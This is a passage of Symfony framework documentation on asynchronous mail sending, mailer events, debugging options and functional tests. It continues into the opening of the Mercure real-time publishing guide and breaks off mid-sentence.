send\nthe messages later via a Messenger transport.\n\nStart by following the :doc:`Messenger </messenger>` documentation and configuring\na transport. Once everything is set up, when you call ``$mailer->send()``, a\n:class:`Symfony\\\\Component\\\\Mailer\\\\Messenger\\\\SendEmailMessage` message will\nbe dispatched through the default message bus (``messenger.default_bus``). Assuming\nyou have a transport called ``async``, you can route the message there:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    async: \"%env(MESSENGER_TRANSPORT_DSN)%\"\n\n                routing:\n                    'Symfony\\Component\\Mailer\\Messenger\\SendEmailMessage': async\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:transport name=\"async\">%env(MESSENGER_TRANSPORT_DSN)%</framework:transport>\n                    <framework:routing message-class=\"Symfony\\Component\\Mailer\\Messenger\\SendEmailMessage\">\n                        <framework:sender service=\"async\"/>\n                    </framework:routing>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->messenger()\n                ->transport('async')->dsn(env('MESSENGER_TRANSPORT_DSN'));\n\n            $framework->messenger()\n                ->routing('Symfony\\Component\\Mailer\\Messenger\\SendEmailMessage')\n                ->senders(['async']);\n        };\n\nThanks to this, instead of being delivered immediately, messages will be sent\nto the transport to be handled later (see :ref:`messenger-worker`). Note that\nthe \"rendering\" of the email (computed headers, body rendering, ...) is also\ndeferred and will only happen just before the email is sent by the Messenger\nhandler.\n\nWhen sending an email asynchronously, its instance must be serializable.\nThis is always the case for :class:`Symfony\\\\Component\\\\Mailer\\\\Mailer`\ninstances, but when sending a\n:class:`Symfony\\\\Bridge\\\\Twig\\\\Mime\\\\TemplatedEmail`, you must ensure that\nthe ``context`` is serializable. If you have non-serializable variables,\nlike Doctrine entities, either replace them with more specific variables or\nrender the email before calling ``$mailer->send($email)``::\n\n    use Symfony\\Component\\Mailer\\MailerInterface;\n    use Symfony\\Component\\Mime\\BodyRendererInterface;\n\n    public function action(MailerInterface $mailer, BodyRendererInterface $bodyRenderer): void\n    {\n        $email = (new TemplatedEmail())\n            ->htmlTemplate($template)\n            ->context($context)\n        ;\n        $bodyRenderer->render($email);\n\n        $mailer->send($email);\n    }\n\nYou can configure which bus is used to dispatch the message using the ``message_bus`` option.\nYou can also set this to ``false`` to call the Mailer transport directly and\ndisable asynchronous delivery.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mailer.yaml\n        framework:\n            mailer:\n                message_bus: app.another_bus\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:mailer\n                    message_bus=\"app.another_bus\"\n                >\n                </framework:mailer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/mailer.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->mailer()\n                ->messageBus('app.another_bus');\n        };\n\n.. note::\n\n    In cases of long-running scripts, and when Mailer uses the\n    :class:`Symfony\\\\Component\\\\Mailer\\\\Transport\\\\Smtp\\\\SmtpTransport`\n    you may manually disconnect from the SMTP server to avoid keeping\n    an open connection to the SMTP server in between sending emails.\n    You can do so by using the ``stop()`` method.\n\nYou can also select the transport by adding an ``X-Bus-Transport`` header (which\nwill be removed automatically from the final message)::\n\n    // Use the bus transport \"app.another_bus\":\n    $email->getHeaders()->addTextHeader('X-Bus-Transport', 'app.another_bus');\n    $mailer->send($email);\n\nAdding Tags and Metadata to Emails\n----------------------------------\n\nCertain 3rd party transports support email *tags* and *metadata*, which can be used\nfor grouping, tracking and workflows. You can add those by using the\n:class:`Symfony\\\\Component\\\\Mailer\\\\Header\\\\TagHeader` and\n:class:`Symfony\\\\Component\\\\Mailer\\\\Header\\\\MetadataHeader` classes. If your transport\nsupports headers, it will convert them to their appropriate format::\n\n    use Symfony\\Component\\Mailer\\Header\\MetadataHeader;\n    use Symfony\\Component\\Mailer\\Header\\TagHeader;\n\n    $email->getHeaders()->add(new TagHeader('password-reset'));\n    $email->getHeaders()->add(new MetadataHeader('Color', 'blue'));\n    $email->getHeaders()->add(new MetadataHeader('Client-ID', '12345'));\n\nIf your transport does not support tags and metadata, they will be added as custom headers:\n\n.. code-block:: text\n\n    X-Tag: password-reset\n    X-Metadata-Color: blue\n    X-Metadata-Client-ID: 12345\n\nThe following transports currently support tags and metadata:\n\n* Brevo\n* Mailgun\n* Mandrill\n* Postmark\n* Sendgrid\n\nThe following transports only support tags:\n\n* MailPace\n* Resend\n\nThe following transports only support metadata:\n\n* Amazon SES (note that Amazon refers to this feature as \"tags\", but Symfony\n  calls it \"metadata\" because it contains a key and a value)\n\nDraft Emails\n------------\n\n:class:`Symfony\\\\Component\\\\Mime\\\\DraftEmail` is a special instance of\n:class:`Symfony\\\\Component\\\\Mime\\\\Email`. Its purpose is to build up an email\n(with body, attachments, etc) and make available to download as an ``.eml`` with\nthe ``X-Unsent`` header. Many email clients can open these files and interpret\nthem as *draft emails*. You can use these to create advanced ``mailto:`` links.\n\nHere's an example of making one available to download::\n\n    // src/Controller/DownloadEmailController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpFoundation\\ResponseHeaderBag;\n    use Symfony\\Component\\Mime\\DraftEmail;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class DownloadEmailController extends AbstractController\n    {\n        #[Route('/download-email')]\n        public function __invoke(): Response\n        {\n            $message = (new DraftEmail())\n                ->html($this->renderView(/* ... */))\n                ->addPart(/* ... */)\n            ;\n\n            $response = new Response($message->toString());\n            $contentDisposition = $response->headers->makeDisposition(\n                ResponseHeaderBag::DISPOSITION_ATTACHMENT,\n                'download.eml'\n            );\n            $response->headers->set('Content-Type', 'message/rfc822');\n            $response->headers->set('Content-Disposition', $contentDisposition);\n\n            return $response;\n        }\n    }\n\n.. note::\n\n    As it's possible for :class:`Symfony\\\\Component\\\\Mime\\\\DraftEmail`'s to be created\n    without a To/From they cannot be sent with the mailer.\n\nMailer Events\n-------------\n\nMessageEvent\n~~~~~~~~~~~~\n\n**Event Class**: :class:`Symfony\\\\Component\\\\Mailer\\\\Event\\\\MessageEvent`\n\n``MessageEvent`` allows to change the Mailer message and the envelope before\nthe email is sent::\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\Mailer\\Event\\MessageEvent;\n    use Symfony\\Component\\Mime\\Email;\n\n    public function onMessage(MessageEvent $event): void\n    {\n        $message = $event->getMessage();\n        if (!$message instanceof Email) {\n            return;\n        }\n        // do something with the message (logging, ...)\n\n        // and/or add some Messenger stamps\n        $event->addStamp(new SomeMessengerStamp());\n    }\n\nIf you want to stop the Message from being sent, call ``reject()`` (it will\nalso stop the event propagation)::\n\n    use Symfony\\Component\\Mailer\\Event\\MessageEvent;\n\n    public function onMessage(MessageEvent $event): void\n    {\n        $event->reject();\n    }\n\nExecute this command to find out which listeners are registered for this event\nand their priorities:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher \"Symfony\\Component\\Mailer\\Event\\MessageEvent\"\n\nSentMessageEvent\n~~~~~~~~~~~~~~~~\n\n**Event Class**: :class:`Symfony\\\\Component\\\\Mailer\\\\Event\\\\SentMessageEvent`\n\n``SentMessageEvent`` allows you to act on the :class:`Symfony\\\\Component\\\\\\Mailer\\\\\\SentMessage`\nclass to access the original message (``getOriginalMessage()``) and some debugging\ninformation (``getDebug()``) such as the HTTP calls made by the HTTP transports,\nwhich is useful for debugging errors::\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\Mailer\\Event\\SentMessageEvent;\n\n    public function onMessage(SentMessageEvent $event): void\n    {\n        $message = $event->getMessage();\n\n        // do something with the message\n    }\n\nExecute this command to find out which listeners are registered for this event\nand their priorities:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher \"Symfony\\Component\\Mailer\\Event\\SentMessageEvent\"\n\nFailedMessageEvent\n~~~~~~~~~~~~~~~~~~\n\n**Event Class**: :class:`Symfony\\\\Component\\\\Mailer\\\\Event\\\\FailedMessageEvent`\n\n``FailedMessageEvent`` allows acting on the initial message in case of a failure::\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\Mailer\\Event\\FailedMessageEvent;\n\n    public function onMessage(FailedMessageEvent $event): void\n    {\n        // e.g you can get more information on this error when sending an email\n        $event->getError();\n\n        // do something with the message\n    }\n\nExecute this command to find out which listeners are registered for this event\nand their priorities:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher \"Symfony\\Component\\Mailer\\Event\\FailedMessageEvent\"\n\nDevelopment & Debugging\n-----------------------\n\n.. _mail-catcher:\n\nEnabling an Email Catcher\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen developing locally, it is recommended to use an email catcher. If you have\nenabled Docker support via Symfony recipes, an email catcher is automatically\nconfigured. In addition, if you are using the :doc:`Symfony local web server\n</setup/symfony_server>`, the mailer DSN is automatically exposed via the\n:ref:`symfony binary Docker integration <symfony-server-docker>`.\n\nSending Test Emails\n~~~~~~~~~~~~~~~~~~~\n\nSymfony provides a command to send emails, which is useful during development\nto test if sending emails works correctly:\n\n.. code-block:: terminal\n\n    # the only mandatory argument is the recipient address\n    # (check the command help to learn about its options)\n    $ php bin/console mailer:test someone@example.com\n\nThis command bypasses the :doc:`Messenger bus </messenger>`, if configured, to\nease testing emails even when the Messenger consumer is not running.\n\nDisabling Delivery\n~~~~~~~~~~~~~~~~~~\n\nWhile developing (or testing), you may want to disable delivery of messages\nentirely. You can do this by using ``null://null`` as the mailer DSN, either in\nyour :ref:`.env configuration files <configuration-multiple-env-files>` or in\nthe mailer configuration file (e.g. in the ``dev`` or ``test`` environments):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mailer.yaml\n        when@dev:\n            framework:\n                mailer:\n                    dsn: 'null://null'\n\n    .. code-block:: xml\n\n        <!-- config/packages/mailer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- ... -->\n            <framework:config>\n                <framework:mailer dsn=\"null://null\"/>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/mailer.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->mailer()\n                ->dsn('null://null');\n        };\n\n.. note::\n\n    If you're using Messenger and routing to a transport, the message will *still*\n    be sent to that transport.\n\nAlways Send to the same Address\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInstead of disabling delivery entirely, you might want to *always* send emails to\na specific address, instead of the *real* address:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mailer.yaml\n        when@dev:\n            framework:\n                mailer:\n                    envelope:\n                        recipients: ['youremail@example.com']\n\n    .. code-block:: xml\n\n        <!-- config/packages/mailer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- ... -->\n            <framework:config>\n                <framework:mailer>\n                    <framework:envelope>\n                        <framework:recipient>youremail@example.com</framework:recipient>\n                    </framework:envelope>\n                </framework:mailer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/mailer.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->mailer()\n                ->envelope()\n                    ->recipients(['youremail@example.com'])\n            ;\n        };\n\nUse the ``allowed_recipients`` option to specify exceptions to the behavior defined\nin the ``recipients`` option; allowing emails directed to these specific recipients\nto maintain their original destination:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mailer.yaml\n        when@dev:\n            framework:\n                mailer:\n                    envelope:\n                        recipients: ['youremail@example.com']\n                        allowed_recipients:\n                            - 'internal@example.com'\n                            # you can also use regular expression to define allowed recipients\n                            - 'internal-.*@example.(com|fr)'\n\n    .. code-block:: xml\n\n        <!-- config/packages/mailer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <!-- ... -->\n            <framework:config>\n                <framework:mailer>\n                    <framework:envelope>\n                        <framework:recipient>youremail@example.com</framework:recipient>\n                        <framework:allowed-recipient>internal@example.com</framework:allowed-recipient>\n                        <!-- you can also use regular expression to define allowed recipients -->\n                        <framework:allowed-recipient>internal-.*@example.(com|fr)</framework:allowed-recipient>\n                    </framework:envelope>\n                </framework:mailer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/mailer.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            // ...\n            $framework->mailer()\n                ->envelope()\n                    ->recipients(['youremail@example.com'])\n                    ->allowedRecipients([\n                        'internal@example.com',\n                        // you can also use regular expression to define allowed recipients\n                        'internal-.*@example.(com|fr)',\n                    ])\n            ;\n        };\n\nWith this configuration, all emails will be sent to ``youremail@example.com``,\nexcept for those sent to ``internal@example.com``, ``internal-monitoring@example.fr``,\netc., which will receive emails as usual.\n\n.. versionadded:: 7.1\n\n    The ``allowed_recipients`` option was introduced in Symfony 7.1.\n\nWrite a Functional Test\n~~~~~~~~~~~~~~~~~~~~~~~\n\nSymfony provides lots of :ref:`built-in mailer assertions <mailer-assertions>`\nto functionally test that an email was sent, its contents or headers, etc.\nThey are available in test classes extending\n:class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Test\\\\KernelTestCase` or when using\nthe :class:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Test\\\\MailerAssertionsTrait`::\n\n    // tests/Controller/MailControllerTest.php\n    namespace App\\Tests\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Test\\WebTestCase;\n\n    class MailControllerTest extends WebTestCase\n    {\n        public function testMailIsSentAndContentIsOk(): void\n        {\n            $client = static::createClient();\n            $client->request('GET', '/mail/send');\n            $this->assertResponseIsSuccessful();\n\n            $this->assertEmailCount(1); // use assertQueuedEmailCount() when using Messenger\n\n            $email = $this->getMailerMessage();\n\n            $this->assertEmailHtmlBodyContains($email, 'Welcome');\n            $this->assertEmailTextBodyContains($email, 'Welcome');\n        }\n    }\n\n.. tip::\n\n   If your controller returns a redirect response after sending the email, make\n   sure to have your client *not* follow redirects. The kernel is rebooted after\n   following the redirection and the message will be lost from the mailer event\n   handler.\n\n.. _`Amazon SES`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Amazon/README.md\n.. _`Azure`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Azure/README.md\n.. _`App Password`: https://support.google.com/accounts/answer/185833\n.. _`Brevo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Brevo/README.md\n.. _`default_socket_timeout`: https://www.php.net/manual/en/filesystem.configuration.php#ini.default-socket-timeout\n.. _`DKIM`: https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail\n.. _`download the foundation-emails.css file`: https://github.com/foundation/foundation-emails/blob/develop/dist/foundation-emails.css\n.. _`Google Gmail`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Google/README.md\n.. _`high availability`: https://en.wikipedia.org/wiki/High_availability\n.. _`Infobip`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Infobip/README.md\n.. _`Inky`: https://get.foundation/emails/docs/inky.html\n.. _`league/html-to-markdown`: https://github.com/thephpleague/html-to-markdown\n.. _`load balancing`: https://en.wikipedia.org/wiki/Load_balancing_(computing)\n.. _`MailerSend`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/MailerSend/README.md\n.. _`Mandrill`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Mailchimp/README.md\n.. _`Mailgun`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Mailgun/README.md\n.. _`Mailjet`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Mailjet/README.md\n.. _`Markdown syntax`: https://commonmark.org/\n.. _`MailPace`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/MailPace/README.md\n.. _`OpenSSL PHP extension`: https://www.php.net/manual/en/book.openssl.php\n.. _`PEM encoded`: https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail\n.. _`Postmark`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Postmark/README.md\n.. _`Resend`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Resend/README.md\n.. _`RFC 3986`: https://www.ietf.org/rfc/rfc3986.txt\n.. _`S/MIME`: https://en.wikipedia.org/wiki/S/MIME\n.. _`Scaleway`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Scaleway/README.md\n.. _`SendGrid`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Sendgrid/README.md\n"
        },
        {
          "name": "mercure.rst",
          "type": "blob",
          "size": 27.095703125,
          "content": "Pushing Data to Clients Using the Mercure Protocol\n==================================================\n\nBeing able to broadcast data in real-time from servers to clients is a\nrequirement for many modern web and mobile applications.\n\nCreating a UI reacting in live to changes made by other users\n(e.g. a user changes the data currently browsed by several other users,\nall UIs are instantly updated),\nnotifying the user when :doc:`an asynchronous job </messenger>` has been\ncompleted or creating chat applications are among the typical use cases\nrequiring \"push\" capabilities.\n\nSymfony provides a straightforward component, built on top of\n`the Mercure protocol`_, specifically designed for this class of use cases.\n\nMercure is an open protocol designed from the ground up to publish updates from\nserver to clients. It is a modern and efficient alternative to timer-based\npolling and to WebSocket.\n\nBecause it is built on top `Server-Sent Events (SSE)`_, Mercure is supported\nout of the box in modern browsers (old versions of Edge and IE require\n`a polyfill`_) and has `high-level implementations`_ in many programming\nlanguages.\n\nMercure comes with an authorization mechanism,\nautomatic reconnection in case of network issues\nwith retrieving of lost updates, a presence API,\n\"connection-less\" push for smartphones and auto-discoverability (a supported\nclient can automatically discover and subscribe to updates of a given resource\nthanks to a specific HTTP header).\n\nAll these features are supported in the Symfony integration.\n\n`In this recording`_ you can see how a Symfony web API leverages Mercure\nand API Platform to update in live a React app and a mobile app (React Native)\ngenerated using the API Platform client generator.\n\nInstallation\n------------\n\nInstalling the Symfony Bundle\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nRun this command to install the Mercure support:\n\n.. code-block:: terminal\n\n    $ composer require mercure\n\nRunning a Mercure Hub\n~~~~~~~~~~~~~~~~~~~~~\n\nTo manage persistent connections, Mercure relies on a Hub: a dedicated server\nthat handles persistent SSE connections with the clients.\nThe Symfony app publishes the updates to the hub, that will broadcast them to\nclients.\n\n.. raw:: html\n\n    <object data=\"_images/mercure/hub.svg\" type=\"image/svg+xml\"\n        alt=\"Flow diagram showing a Symfony app communicating with the Mercure Hub using a POST request, and the Mercure Hub using SSE to communicate to the clients.\"\n    ></object>\n\nIn production, you have to install a Mercure hub by yourself.\nAn official and open source (AGPL) hub based on the Caddy web server\ncan be downloaded as a static binary from `Mercure.rocks`_.\nA Docker image, a Helm chart for Kubernetes\nand a managed, High Availability Hub are also provided.\n\nThanks to :doc:`the Docker integration of Symfony </setup/docker>`,\n:ref:`Flex <symfony-flex>` proposes to install a Mercure hub for development.\nRun ``docker-compose up`` to start the hub if you have chosen this option.\n\nIf you use the :doc:`Symfony Local Web Server </setup/symfony_server>`,\nyou must start it with the ``--no-tls`` option.\n\n.. code-block:: terminal\n\n    $ symfony server:start --no-tls -d\n\nIf you use the Docker integration, a hub is already up and running.\n\nConfiguration\n-------------\n\nThe preferred way to configure MercureBundle is using\n:doc:`environment variables </configuration>`.\n\nWhen MercureBundle has been installed, the ``.env`` file of your project\nhas been updated by the Flex recipe to include the available env vars.\n\nAlso, if you are using the Docker integration with the Symfony Local Web Server,\n`Symfony Docker`_ or the `API Platform distribution`_,\nthe proper environment variables have been automatically set.\nSkip straight to the next section.\n\nOtherwise, set the URL of your hub as the value of the ``MERCURE_URL``\nand ``MERCURE_PUBLIC_URL`` env vars.\nSometimes a different URL must be called by the Symfony app (usually to publish),\nand the JavaScript client (usually to subscribe). It's especially common when\nthe Symfony app must use a local URL and the client-side JavaScript code a public one.\nIn this case, ``MERCURE_URL`` must contain the local URL used by the\nSymfony app (e.g. ``https://mercure/.well-known/mercure``), and ``MERCURE_PUBLIC_URL``\nthe publicly available URL (e.g. ``https://example.com/.well-known/mercure``).\n\nThe clients must also bear a `JSON Web Token`_ (JWT)\nto the Mercure Hub to be authorized to publish updates and, sometimes, to subscribe.\n\nThis token must be signed with the same secret key as the one used by the Hub to verify the JWT (``!ChangeThisMercureHubJWTSecretKey!`` if you use the Docker integration).\nThis secret key must be stored in the ``MERCURE_JWT_SECRET`` environment variable.\nMercureBundle will use it to automatically generate and sign the needed JWTs.\n\nIn addition to these environment variables,\nMercureBundle provides a more advanced configuration:\n\n* ``secret``: the key to use to sign the JWT - A key of the same size as the hash output (for instance, 256 bits for \"HS256\") or larger MUST be used. (all other options, beside ``algorithm``, ``subscribe``, and ``publish`` will be ignored)\n* ``publish``: a list of topics to allow publishing to when generating the JWT (only usable when ``secret``, or ``factory`` are provided)\n* ``subscribe``: a list of topics to allow subscribing to when generating the JWT (only usable when ``secret``, or ``factory`` are provided)\n* ``algorithm``: The algorithm to use to sign the JWT (only usable when ``secret`` is provided)\n* ``provider``: The ID of a service to call to provide the JWT (all other options will be ignored)\n* ``factory``: The ID of a service to call to create the JWT (all other options, beside ``subscribe``, and ``publish`` will be ignored)\n* ``value``: the raw JWT to use (all other options will be ignored)\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mercure.yaml\n        mercure:\n            hubs:\n                default:\n                    url: '%env(string:MERCURE_URL)%'\n                    public_url: '%env(string:MERCURE_PUBLIC_URL)%'\n                    jwt:\n                        secret: '%env(string:MERCURE_JWT_SECRET)%'\n                        publish: ['https://example.com/foo1', 'https://example.com/foo2']\n                        subscribe: ['https://example.com/bar1', 'https://example.com/bar2']\n                        algorithm: 'hmac.sha256'\n                        provider: 'My\\Provider'\n                        factory: 'My\\Factory'\n                        value: 'my.jwt'\n\n    .. code-block:: xml\n\n        <!-- config/packages/mercure.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <config>\n            <hub\n                name=\"default\"\n                url=\"%env(string:MERCURE_URL)%\"\n                public_url=\"%env(string:MERCURE_PUBLIC_URL)%\"\n            > <!-- public_url defaults to url -->\n                <jwt\n                    secret=\"%env(string:MERCURE_JWT_SECRET)%\"\n                    algorithm=\"hmac.sha256\"\n                    provider=\"My\\Provider\"\n                    factory=\"My\\Factory\"\n                    value=\"my.jwt\"\n                >\n                    <publish>https://example.com/foo1</publish>\n                    <publish>https://example.com/foo2</publish>\n                    <subscribe>https://example.com/bar1</subscribe>\n                    <subscribe>https://example.com/bar2</subscribe>\n                </jwt>\n            </hub>\n        </config>\n\n    .. code-block:: php\n\n        // config/packages/mercure.php\n        $container->loadFromExtension('mercure', [\n            'hubs' => [\n                'default' => [\n                    'url' => '%env(string:MERCURE_URL)%',\n                    'public_url' => '%env(string:MERCURE_PUBLIC_URL)%',\n                    'jwt' => [\n                        'secret' => '%env(string:MERCURE_JWT_SECRET)%',\n                        'publish' => ['https://example.com/foo1', 'https://example.com/foo2'],\n                        'subscribe' => ['https://example.com/bar1', 'https://example.com/bar2'],\n                        'algorithm' => 'hmac.sha256',\n                        'provider' => 'My\\Provider',\n                        'factory' => 'My\\Factory',\n                        'value' => 'my.jwt',\n                    ],\n                ],\n            ],\n        ]);\n\n.. tip::\n\n    The JWT payload must contain at least the following structure for the client to be allowed to\n    publish:\n\n    .. code-block:: json\n\n        {\n            \"mercure\": {\n                \"publish\": [\"*\"]\n            }\n        }\n\n    The jwt.io website is a convenient way to create and sign JWTs, checkout this `example JWT`_.\n    Don't forget to set your secret key properly in the bottom of the right panel of the form!\n\nBasic Usage\n-----------\n\nPublishing\n~~~~~~~~~~\n\nThe Mercure Component provides an ``Update`` value object representing\nthe update to publish. It also provides a ``Publisher`` service to dispatch\nupdates to the Hub.\n\nThe ``Publisher`` service can be injected using the\n:doc:`autowiring </service_container/autowiring>` in any other\nservice, including controllers::\n\n    // src/Controller/PublishController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Mercure\\HubInterface;\n    use Symfony\\Component\\Mercure\\Update;\n\n    class PublishController extends AbstractController\n    {\n        public function publish(HubInterface $hub): Response\n        {\n            $update = new Update(\n                'https://example.com/books/1',\n                json_encode(['status' => 'OutOfStock'])\n            );\n\n            $hub->publish($update);\n\n            return new Response('published!');\n        }\n    }\n\nThe first parameter to pass to the ``Update`` constructor is\nthe **topic** being updated. This topic should be an `IRI`_\n(Internationalized Resource Identifier, RFC 3987): a unique identifier\nof the resource being dispatched.\n\nUsually, this parameter contains the original URL of the resource\ntransmitted to the client, but it can be any string or `IRI`_,\nand it doesn't have to be a URL that exists (similarly to XML namespaces).\n\nThe second parameter of the constructor is the content of the update.\nIt can be anything, stored in any format.\nHowever, serializing the resource in a hypermedia format such as JSON-LD,\nAtom, HTML or XML is recommended.\n\nSubscribing\n~~~~~~~~~~~\n\nSubscribing to updates in JavaScript from a Twig template is straightforward:\n\n.. code-block:: html+twig\n\n    <script>\n    const eventSource = new EventSource(\"{{ mercure('https://example.com/books/1')|escape('js') }}\");\n    eventSource.onmessage = event => {\n        // Will be called every time an update is published by the server\n        console.log(JSON.parse(event.data));\n    }\n    </script>\n\nThe ``mercure()`` Twig function generates the URL of the Mercure hub\naccording to the configuration. The URL includes the ``topic`` query\nparameters corresponding to the topics passed as first argument.\n\nIf you want to access to this URL from an external JavaScript file, generate the\nURL in a dedicated HTML element:\n\n.. code-block:: html+twig\n\n    <script type=\"application/json\" id=\"mercure-url\">\n    {{ mercure('https://example.com/books/1')|json_encode(constant('JSON_UNESCAPED_SLASHES') b-or constant('JSON_HEX_TAG'))|raw }}\n    </script>\n\nThen retrieve it from your JS file:\n\n.. code-block:: javascript\n\n    const url = JSON.parse(document.getElementById(\"mercure-url\").textContent);\n    const eventSource = new EventSource(url);\n    // ...\n\nMercure also allows subscribing to several topics,\nand to use URI Templates or the special value ``*`` (matched by all topics)\nas patterns:\n\n.. code-block:: html+twig\n\n    <script>\n    {# Subscribe to updates of several Book resources and to all Review resources matching the given pattern #}\n    const eventSource = new EventSource(\"{{ mercure([\n        'https://example.com/books/1',\n        'https://example.com/books/2',\n        'https://example.com/reviews/{id}'\n    ])|escape('js') }}\");\n\n    eventSource.onmessage = event => {\n        console.log(JSON.parse(event.data));\n    }\n    </script>\n\n.. tip::\n\n    Test if a URI Template matches a URL using `the online debugger`_\n\n.. tip::\n\n    Google Chrome features a practical UI to display the received events:\n\n    .. image:: /_images/mercure/chrome.png\n        :alt: The Chrome DevTools showing the EventStream tab containing information about each SSE event.\n\n    In DevTools, select the \"Network\" tab, then click on the request to the Mercure hub, then on the \"EventStream\" 